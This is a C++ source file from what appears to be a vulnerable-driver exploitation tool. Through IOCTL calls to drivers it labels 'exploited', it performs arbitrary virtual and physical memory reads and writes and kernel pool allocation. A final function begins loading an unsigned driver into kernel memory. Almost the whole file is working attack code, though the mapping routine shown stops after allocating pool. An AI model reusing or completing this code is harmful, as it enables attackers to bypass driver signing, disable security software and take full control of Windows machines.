#include "ioctl.h"


DWORD VirtualOperation(ULONG64 Address, ULONG64 Size, PVOID Buffer, BOOL IsRead, ExploitedDriver* DbuDriver) {
	DWORD CurrentIoctlCode = 0;
	DWORD BytesOperated = 0;
	DWORD TotalBufferSize = (DWORD)Size + VIRTUAL_OPERATION_PARAMETERSIZE;
	if (!DbuDriver->IsRunning()) {
		if (!DbuDriver->StartDriverService()) {
			printf("[-] Cannot start driver service to perform read/write operation on virtual memory\n");
			return 0;
		}
	}

	PVOID IoInputBuffer = malloc(TotalBufferSize);
	if (IoInputBuffer == NULL) {
		if (IsRead) {
			printf("[-] Could not allocate buffer for input of IOCTL for virtual read operation\n");
		}
		else {
			printf("[-] Could not allocate buffer for input of IOCTL for virtual write operation\n");
		}
		return 0;
	}
	RtlZeroMemory(IoInputBuffer, TotalBufferSize);  // Already sets value for first 8 unsused bytes and the offset (not used)
	memcpy((PVOID)((ULONG64)IoInputBuffer + 8), &Address, 8);

	if (IsRead) {
		CurrentIoctlCode = IOCTL_VIRTUAL_READ;  // no need for setting buffer values, area is empty and will be filled after the read operation
	}
	else {
		CurrentIoctlCode = IOCTL_VIRTUAL_WRITE;
		memcpy((PVOID)((ULONG64)IoInputBuffer + VIRTUAL_OPERATION_PARAMETERSIZE), Buffer, Size);
	}

	if (!DbuDriver->OpenDriverHandle(TRUE)) {
		printf("[-] Cannot get handle to the driver used to perform read/write operation on virtual memory\n");
		return 0;
	}

	BOOL IoctlRes = DeviceIoControl(DbuDriver->GetDriverHandle(), CurrentIoctlCode, IoInputBuffer, TotalBufferSize, IoInputBuffer, TotalBufferSize, &BytesOperated, NULL);
	if (IoctlRes) {
		if (IsRead) {
			printf("[+] Virtual read succeeded, read %lu bytes!\n", BytesOperated);
			memcpy(Buffer, (PVOID)((ULONG64)IoInputBuffer + VIRTUAL_OPERATION_PARAMETERSIZE), Size);
		}
		else {
			printf("[+] Virtual write succeeded, written %lu bytes!\n", BytesOperated);
		}
	}
	else {
		if (IsRead) {
			printf("[-] Virtual read failed!\n");
		}
		else {
			printf("[-] Virtual write failed!\n");
		}
		free(IoInputBuffer);
		return 0;
	}

	free(IoInputBuffer);
	return BytesOperated;
}


DWORD PhysicalOperation(ULONG64 Address, ULONG64 Size, PVOID Buffer, BOOL IsRead, ExploitedDriver* DbuDriver) {
	DWORD CurrentIoctlCode = 0;
	DWORD BytesOperated = 0;
	DWORD TotalBufferSize = (DWORD)Size + PHYSICAL_OPERATION_PARAMETERSIZE;
	if (!DbuDriver->IsRunning()) {
		if (!DbuDriver->StartDriverService()) {
			printf("[-] Cannot start driver service to perform read/write operation on physical memory\n");
			return 0;
		}
	}

	PVOID IoInputBuffer = malloc(TotalBufferSize);
	if (IoInputBuffer == NULL) {
		if (IsRead) {
			printf("[-] Could not allocate buffer for input of IOCTL for physical read operation\n");
		}
		else {
			printf("[-] Could not allocate buffer for input of IOCTL for physical write operation\n");
		}
		return 0;
	}
	RtlZeroMemory(IoInputBuffer, TotalBufferSize);  // Already zeroes the first unused field in the input buffer (DeviceExtension[0])
	memcpy((PVOID)((ULONG64)IoInputBuffer + 8), &Address, 8);  // DeviceExtension[1] = PhysicalAddress

	if (IsRead) {
		CurrentIoctlCode = IOCTL_PHYSICAL_READ;  // no need for setting buffer values, area is empty and will be filled after the read operation
	}
	else {
		CurrentIoctlCode = IOCTL_PHYSICAL_WRITE;
		memcpy((PVOID)((ULONG64)IoInputBuffer + PHYSICAL_OPERATION_PARAMETERSIZE), Buffer, Size);
	}

	if (!DbuDriver->OpenDriverHandle(TRUE)) {
		printf("[-] Cannot get handle to the driver used to perform read/write operation on physical memory\n");
		return 0;
	}

	BOOL IoctlRes = DeviceIoControl(DbuDriver->GetDriverHandle(), CurrentIoctlCode, IoInputBuffer, TotalBufferSize, IoInputBuffer, TotalBufferSize, &BytesOperated, NULL);
	if (IoctlRes) {
		if (IsRead) {
			printf("[+] Physical read succeeded, read %lu bytes!\n", BytesOperated);
			memcpy(Buffer, (PVOID)((ULONG64)IoInputBuffer + PHYSICAL_OPERATION_PARAMETERSIZE), Size);
		}
		else {
			printf("[+] Physical write succeeded, written %lu bytes!\n", BytesOperated);
		}
	}
	else {
		if (IsRead) {
			printf("[-] Physical read failed!\n");
		}
		else {
			printf("[-] Physical write failed!\n");
		}
		free(IoInputBuffer);
		return 0;
	}
	free(IoInputBuffer);
	return BytesOperated;
}


DWORD AllocateContiguousMemory(ExploitedDriver* DbuDriver) {
	DWORD BytesOperated = 0;
	if (!DbuDriver->IsRunning()) {
		if (!DbuDriver->StartDriverService()) {
			printf("[-] Cannot start driver service to allocate contiguous kernel pool\n");
			return 0;
		}
	}

	PVOID IoInputBuffer = malloc(ALLOCATE_CONTIGUOUS_OVERALLSIZE);
	if (IoInputBuffer == NULL) {
		printf("[-] Could not allocate buffer for input of IOCTL for allocating contiguous memory operation\n");
		return 0;
	}

	if (!DbuDriver->OpenDriverHandle(TRUE)) {
		printf("[-] Cannot get handle to the driver used to allocate contiguous kernel pool\n");
		return 0;
	}

	BOOL IoctlRes = DeviceIoControl(DbuDriver->GetDriverHandle(), IOCTL_ALLOCATE_CONTIGUOUS, IoInputBuffer, ALLOCATE_CONTIGUOUS_OVERALLSIZE, IoInputBuffer, ALLOCATE_CONTIGUOUS_OVERALLSIZE, &BytesOperated, NULL);
	printf("Bytes operated (probably size of allocation): %lu\n", BytesOperated);
	if (IoctlRes) {
		printf("[+] Allocating contiguous memory succeeded!\n");
	}
	else {
		printf("[-] Allocating contiguous memory did not succeed!\n");
	}
	free(IoInputBuffer);
	return (DWORD)IoctlRes;
}


DWORD AllocatePageSizeKernelPool(ExploitedDriver* BsDriver) {
	DWORD BytesOperated = 0;

	if (!BsDriver->IsRunning()) {
		if (!BsDriver->StartDriverService()) {
			printf("[-] Cannot start driver service to allocate PAGE_SIZE (0x1000) kernel pool\n");
			return 0;
		}
	}

	if (!BsDriver->OpenDriverHandle(TRUE)) {
		printf("[-] Cannot get handle to the driver used to allocate PAGE_SIZE (0x1000) kernel pool\n");
		return 0;
	}

	BOOL IoctlRes = DeviceIoControl(BsDriver->GetDriverHandle(), IOCTL_ALLOCATE_KMPOOLPGSZ, NULL, NULL, NULL, NULL, &BytesOperated, NULL);
	printf("Bytes operated (probably size of allocation): %lu\n", BytesOperated);
	if (IoctlRes) {
		printf("[+] Allocating PAGE_SIZE (0x1000) kernel pool succeeded!\n");
	}
	else {
		printf("[-] Allocating PAGE_SIZE (0x1000) kernel pool did not succeed!\n");
	}
	return (DWORD)IoctlRes;
}


DWORD FreePageSizeKernelPool(ExploitedDriver* BsDriver) {
	DWORD BytesOperated = 0;

	if (!BsDriver->IsRunning()) {
		if (!BsDriver->StartDriverService()) {
			printf("[-] Cannot start driver service to free PAGE_SIZE (0x1000) kernel pool\n");
			return 0;
		}
	}

	if (!BsDriver->OpenDriverHandle(TRUE)) {
		printf("[-] Cannot get handle to the driver used to free PAGE_SIZE (0x1000) kernel pool\n");
		return 0;
	}

	BOOL IoctlRes = DeviceIoControl(BsDriver->GetDriverHandle(), IOCTL_FREE_KMPOOLPGSZ, NULL, NULL, NULL, NULL, &BytesOperated, NULL);
	printf("Bytes operated (probably size of pool that was freed): %lu\n", BytesOperated);
	if (IoctlRes) {
		printf("[+] Freeing PAGE_SIZE (0x1000) kernel pool succeeded!\n");
	}
	else {
		printf("[-] Freeing PAGE_SIZE (0x1000) kernel pool did not succeed!\n");
	}
	return (DWORD)IoctlRes;
}


DWORD AllocateKernelPool(ExploitedDriver* LhaDriver) {
	DWORD BytesOperated = 0;

	if (!LhaDriver->IsRunning()) {
		if (!LhaDriver->StartDriverService()) {
			printf("[-] Cannot start driver service to allocate dynamically-sized kernel pool\n");
			return 0;
		}
	}

	ULONG64* IoInputBuffer = (ULONG64*)malloc(ALLOCATE_KMPOOLDYN_OVERALLSIZE);
	if (IoInputBuffer == NULL) {
		printf("[-] Could not allocate buffer for input of IOCTL for dynamically-sized kernel pool\n");
		return 0;
	}
	RtlZeroMemory(IoInputBuffer, ALLOCATE_KMPOOLDYN_OVERALLSIZE);
	
	if (!LhaDriver->OpenDriverHandle(TRUE)) {
		printf("[-] Cannot get handle to the driver used to allocate dynamically-sized kernel pool\n");
		free(IoInputBuffer);
		return 0;
	}

	BOOL IoctlRes = DeviceIoControl(LhaDriver->GetDriverHandle(), IOCTL_ALLOCATE_KMPOOLDYN, IoInputBuffer, ALLOCATE_KMPOOLDYN_OVERALLSIZE, IoInputBuffer, ALLOCATE_KMPOOLDYN_OVERALLSIZE, &BytesOperated, NULL);
	printf("Bytes operated (should be %lu - size of bytes operated on): %lu\n", (ULONG)ALLOCATE_KMPOOLDYN_OVERALLSIZE, BytesOperated);
	printf("[!] Value in provided buffer as ULONG64 -> %llu, value in provided buffer as PVOID -> %p\n", *IoInputBuffer, (PVOID)*IoInputBuffer);

	if (IoctlRes) {
		printf("[+] Allocating dynamically-sized kernel pool succeeded!\n");
	}
	else {
		printf("[-] Allocating dynamically-sized kernel pool did not succeed!\n");
	}
	free(IoInputBuffer);
	LhaDriver->CloseDriverHandle();
	return (DWORD)IoctlRes;
}


BOOL MapDriverIntoMemory(char* DriverPath, ExploitedDriver* VulnDrivers[3]) {
	if (strcmp(DriverPath, "") == 0) {
		printf("[-] Empty driver file path\n");
		return FALSE;
	}

	// Read content of unsigned driver into memory -
	HANDLE DriverHandle = CreateFileA(DriverPath,
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (DriverHandle == INVALID_HANDLE_VALUE) {
		printf("[-] Cannot get the handle for the driver file - %d\n", GetLastError());
		return FALSE;
	}

	DWORD DriverSize = GetFileSize(DriverHandle, NULL);
	if (DriverSize == 0) {
		printf("[-] Invalid value: driver size = 0\n");
		CloseHandle(DriverHandle);
		return FALSE;
	}

	PVOID DriverData = malloc((SIZE_T)DriverSize);
	if (DriverData == NULL) {
		printf("[-] Cannot allocate memory for unsigned driver data buffer\n");
		CloseHandle(DriverHandle);
		return FALSE;
	}

	DWORD DriverBytesRead = 0;
	if (!ReadFile(DriverHandle, DriverData, DriverSize, &DriverBytesRead, NULL)) {
		printf("[-] Cannot read unsigned driver data from file - %d\n", GetLastError());
		free(DriverData);
		CloseHandle(DriverHandle);
		return FALSE;
	}

	if (DriverBytesRead != DriverSize) {
		printf("[-] Read only %lu bytes of unsigned driver data out of %lu total bytes\n", DriverBytesRead, DriverSize);
		free(DriverData);
		CloseHandle(DriverHandle);
		return FALSE;
	}

	if (!VulnDrivers[2]->StartDriverService()) {
		printf("[-] Cannot start LHD service and load the driver for allocating kernel memory\n");
		free(DriverData);
		CloseHandle(DriverHandle);
		return FALSE;
	}

	if (!AllocateKernelPool(VulnDrivers[2])) {
		printf("[-] Allocation of kernel memory for driver failed\n");
		free(DriverData);
		CloseHandle(DriverHandle);
		return FALSE;
	}

	free(DriverData);
	CloseHandle(DriverHandle);
	return TRUE;
}